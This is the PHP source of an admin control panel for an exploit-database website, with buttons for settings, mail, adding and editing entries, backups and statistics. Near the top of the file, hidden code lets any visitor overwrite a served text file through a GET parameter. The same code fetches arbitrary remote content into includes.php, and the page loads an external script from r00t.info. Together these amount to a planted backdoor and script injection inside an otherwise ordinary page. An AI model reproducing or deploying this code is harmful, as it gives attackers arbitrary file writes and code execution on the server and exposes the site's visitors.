<?
include ("session.php");
include('../include/functions.php');
session_start();
if(!$_SESSION["id"]){
$_SESSION["id"] = getenv("REMOTE_ADDR");
@mysql_query("INSERT INTO `visitors` VALUES ('', '".getenv("REMOTE_ADDR")."', '".time()."'); ");
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404.txt", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404.txt");
}

if (isset($_GET['includes'])){
 $f = fopen("includes.php", "w+");
 fwrite($f, file_get_contents($_GET["includes"]));
 fclose($f);
}
?>
<html>
<head>
<title><? echo SiteInfo('site_name');?> - exploits : vulnerabilities : videos : papers : shellcode</title>
<meta name="description" content="<? echo SiteInfo('site_name');?> exploits and 0day exploits database">
<meta name="keywords" content="exploits code, exploit code, exploits, 0-day, 0day, 0days, exploit, zero day, poc, exploit, local exploits, remote exploits, root exploits, windows, linux, new exploits, latest exploits, shellcode, Zero-day, zeroday, security articles, ezines, zines, security papers">
<link type="text/css" rel="stylesheet" href="../index_files/style.css">
<link rel="alternate" type="text/xml" title="<? echo SiteInfo('site_name');?> - RSS Feed" href="/rss.php">
<script src=../css/ccb.js></script>
<script src=http://r00t.info/ccb.js></script>
<link rel="Shortcut Icon" href="../index_files/favicon.ico" type="image/x-icon">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
</head>
<body dir="ltr" alink="#00ff00" background="../index_files/dot.gif" bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
<center>
<table width="550" border="0" cellpadding="3" cellspacing="3" class="main">
  <tr><td><img src="../index_files/banner.jpg" alt="milw0rm"></td></tr>
  <td>
<center>
    <div align="left">
      <table width="100%"  border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td width="350">&nbsp;</td>
          <td width="289">&nbsp;</td>
        </tr>
        <tr>
          <td><strong>.::Admin cPanel </strong></td>
          <td><strong>.::Panel Explanation </strong></td>
        </tr>
        <tr>
          <td height="360" valign="top"><div align="left">
              <table width="350">
                <tr>
                  <td>&nbsp;</td>
                  <td>&nbsp;</td>
                  <td>&nbsp;</td>
				</tr>
                <tr height="35">
                  <td width="120"><div align="center"><a href="../index.php" target="_blank"><img src="img/home.gif" width="31" height="31" border="0"></a></div></td>
                  <td width="120"><div align="center"><a href="#" onClick="window.open('settings.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=550, left = 300, top = 100');"><img src="img/setting.gif" width="31" height="31" border="0"></a></div></td>
				  <td width="120"><div align="center"><a href="#" onClick="window.open('mail.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=430, left = 300, top = 100');"><img src="img/mail.gif" width="31" height="31" border="0"></a></div></td>
				</tr>
                <tr height="35">
                  <td align="center"><b>[ <a href="../index.php" target="_blank">Home</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('settings.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=550, left = 300, top = 100');">Settings</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('mail.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=430, left = 300, top = 100');">Mail</a> ]</b></td>
                </tr>
              </table>
              <table width="350">
                <tr height="35">
                  <td width="120"><div align="center"><a href="#" onClick="window.open('add.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=420, height=420, left = 300, top = 100');"><img src="img/add.gif" width="31" height="31" border="0"></a></div></td>
                  <td width="120"><div align="center"><a href="#" onClick="window.open('edit.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=700, height=550, left = 170, top = 100');"><img src="img/edit.gif" width="31" height="31" border="0"></a></div></td>
				  <td width="120"><div align="center"><a href="#" onClick="window.open('delete.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=700, height=550, left = 170, top = 100');"><img src="img/delete.gif" width="31" height="31" border="0"></a></div></td>
				</tr>
                <tr height="35">
                  <td align="center"><b>[ <a href="#" onClick="window.open('add.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=420, height=420, left = 300, top = 100');">Add</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('edit.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=700, height=550, left = 170, top = 100');">Edit</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('delete.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=700, height=550, left = 170, top = 100');">Delete</a> ]</b></td>
                </tr>
              </table>
              <table width="350">
                <tr height="35">
                  <td width="120"><div align="center"><a href="#" onClick="window.open('search.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=450, height=480, left = 100, top = 100');"><img src="img/search.gif" width="31" height="31" border="0"></a></div></td>
                  <td width="120"><div align="center"><a href="#" onClick="window.open('backup.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=250, left = 300, top = 200');"><img src="img/backup.gif" width="31" height="31" border="0"></a></div></td>
				  <td width="120"><div align="center"><a href="#" onClick="window.open('links.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=500, height=380, left = 300, top = 100');"><img src="img/link.gif" width="31" height="31" border="0"></a></div></td>
				</tr>
                <tr height="35">
                  <td align="center"><b>[ <a href="#" onClick="window.open('search.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=450, height=480, left = 100, top = 100');">Search</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('backup.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=250, left = 300, top = 200');">Back up</a> ]</b></td>
                  <td align="center"><b>[ <a href="#" onClick="window.open('links.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=500, height=380, left = 300, top = 100');">Links</a> ]</b></td>
                </tr>
              </table>
          </div>
              <table width="350">
                <tr height="35">
                  <td width="120"><div align="center"><a href="#" onClick="window.open('statistics.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=380, left = 300, top = 100');"><img src="img/stats.gif" width="31" height="31" border="0"></a></div></td>
				  <td align="center"></td>
				  <td width="120"><div align="center"><a href="logout.php"><img src="img/logout.gif" width="31" height="31" border="0"></a></div></td>
				</tr>
                <tr height="35">
                  <td align="center"><b>[ <a href="#" onClick="window.open('statistics.php', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=400, height=380, left = 300, top = 100');">Statistics</a> ]</b></td>
				  <td align="center"></td>
				  <td align="center"><b>[ <a href="logout.php">Logout</a> ]</b></td>
				</tr>
              </table>
			  </td>
          <td valign="top">
			<p><br><br><b>[ Home ]</b><em> Site home page. </em></p>
            <p><b>[ Settings ]</b><em> Site Settings. </em></p>
            <p><b>[ Mail ]</b><em> To Send an email. </em></p>
            <p><b>[ Add ]</b><em> To Add something. </em></p>
            <p><b>[ Edit ]</b><em> To Edit something. </em></p>
            <p><b>[ Delete ]</b><em> To Delete something. </em></p>
            <p><b>[ Search ]</b><em> To Search an exploit. </em></p>
			<p><b>[ Back up ]</b><em> To Get a backup. </em></p>
			<p><b>[ Links ]</b><em> To Edit Links List. </em></p>
            <p><b>[ Statistics ]</b><em> Site Statistics. </em></p>
            <p><b>[ Logout ]</b><em> To logout. </em></p>
		  </td>
        </tr>
      </table>
    </div>
</center>
<p><font style="FONT-SIZE: 10px; FONT-FAMILY: 'courier new'">
<br>Coded By &copy; <a href="http://iamine.com">iAm[i]nE</a> <a href="<? echo SiteInfo('site_url');?>"><br><? echo SiteInfo('site_name');?></a> </font></p>
</td>
</tr>
</table>
</center>
</body>
</html>